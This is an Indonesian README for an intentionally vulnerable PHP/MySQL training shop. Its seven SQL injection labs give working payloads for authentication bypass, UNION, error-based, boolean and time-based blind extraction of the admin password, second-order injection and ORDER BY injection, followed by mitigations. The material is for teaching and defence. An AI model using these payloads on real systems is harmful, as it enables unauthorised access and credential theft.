# SQL Injection Lab — VulnShop

Aplikasi toko fiktif (PHP 8 + MySQL 8) yang **sengaja dibuat rentan** terhadap berbagai jenis
SQL Injection, mengikuti kategori yang dipakai PortSwigger Web Security Academy:

| Lab | Kategori PortSwigger | File | Parameter |
|---|---|---|---|
| 1 | In-band — Authentication bypass | `lab1_login_bypass.php` | `username`, `password` (POST) |
| 2 | In-band — UNION-based | `lab2_union.php` | `id` (GET, numeric context) |
| 3 | In-band — Error-based | `lab3_error_based.php` | `category` (GET, string context) |
| 4 | Blind — Boolean-based | `lab4_blind_boolean.php` | `id` (GET) |
| 5 | Blind — Time-based | `lab5_blind_time.php` | `id` (GET) |
| 6 | Second-order SQLi | `lab6_second_order.php` | `username` (POST, saat register) |
| 7 | SQLi pada klausa `ORDER BY` | `lab7_order_by.php` | `sort` (GET) |

> ⚠️ **PERINGATAN**: Aplikasi ini sengaja rentan. Jangan deploy ke server publik / internet.
> Jalankan hanya di jaringan lab/lokal yang terisolasi (mis. laptop peserta atau VM training).

## Menjalankan

> Lab ini adalah bagian dari satu stack terpadu. Jalankan dari **root repo** (bukan dari
> folder ini), lihat [README.md utama](../README.md) untuk portal navigasinya.

```bash
cd ..            # ke root repo
docker compose up -d --build
```

Buka langsung `http://localhost:8079/sqli/`, atau lewat Portal di `http://localhost:8079/` →
kategori **A05: Injection** → **SQL Injection**. MySQL akan otomatis di-seed dari
`db/init.sql` (butuh beberapa detik pertama kali sampai healthcheck db lulus).

> Semua akses lewat `gateway` (login Basic Auth, satu port untuk semua lab) — lihat
> [README.md utama](../README.md) bagian "Menjalankan (lokal)" untuk cara generate
> kredensialnya. Login cukup sekali, berlaku juga untuk lab XSS/Command Injection.

Untuk mematikan semuanya dan menghapus data (dari root repo):

```bash
docker compose down -v
```

## Kredensial & data awal

Tabel `users` (lihat `db/init.sql`):

| username | password | role |
|---|---|---|
| admin | S3cr3tAdminPass! | admin |
| alice | alice123 | user |
| bob | bobpass99 | user |

Peserta **tidak** diberi tahu password admin di awal — tujuannya adalah mengekstraknya lewat
SQL Injection (Lab 1–5).

## Panduan tiap lab

### Lab 1 — Authentication Bypass
Query: `SELECT * FROM users WHERE username='$user' AND password='$pass'`

Coba:
- Username: `admin' -- -` , password: apa saja
- Username: `' OR '1'='1' -- -`

### Lab 2 — UNION-based
Query: `SELECT id, name, description, price FROM products WHERE id = $id`

Langkah:
1. Cari jumlah kolom: `?id=0 UNION SELECT 1,2,3,4-- -` (ubah jumlah angka sampai tidak error)
2. Cari kolom yang string: `?id=0 UNION SELECT 1,'a','b',4-- -`
3. Ambil data user: `?id=0 UNION SELECT id,username,password,role FROM users-- -`

### Lab 3 — Error-based
Query: `SELECT id, name, price FROM products WHERE category = '$category'`

Coba:
```
category=' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
category=' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin')))-- -
```

### Lab 4 — Blind Boolean-based
Tidak ada data/error yang tampil, hanya "In stock" / "Not found" sebagai oracle.

```
id=1 AND 1=1        -> In stock
id=1 AND 1=2        -> Not found
id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S'
```
Ulangi per karakter untuk mengekstrak seluruh password admin.

### Lab 5 — Blind Time-based
Respons selalu identik; gunakan waktu respons sebagai sinyal.

```
id=1 AND SLEEP(3)
id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S',SLEEP(3),0)
```

### Lab 6 — Second-order
1. Register dengan username: `x' UNION SELECT password FROM users WHERE username='admin'-- -`
2. Klik "View My Bio" — payload yang tersimpan dieksekusi ulang di query kedua.

### Lab 7 — ORDER BY
UNION tidak bisa dipakai langsung di `ORDER BY`. Gunakan oracle boolean:
```
sort=(CASE WHEN (1=1) THEN name ELSE price END)
sort=(CASE WHEN (1=2) THEN name ELSE price END)
```
Bandingkan urutan hasil untuk kondisi true vs false. Materi tambahan (opsional, tingkat
lanjut): teknik error-based ganda pada MySQL menggunakan `GROUP BY` + `RAND()` duplicate-key
trick.

## Mitigasi (untuk didiskusikan setelah lab)
- Gunakan **prepared statements / parameterized queries** (mysqli/PDO `bindParam`) di semua lab.
- Untuk Lab 7, whitelist nama kolom/arah sort yang diperbolehkan, jangan pernah concatenate.
- Least privilege pada akun DB aplikasi (jangan pakai root).
- Disable tampilan error SQL mentah ke user (Lab 3).
- Untuk Lab 6: validasi/sanitasi ulang setiap kali data dipakai dalam query baru, bukan hanya
  saat pertama disimpan.
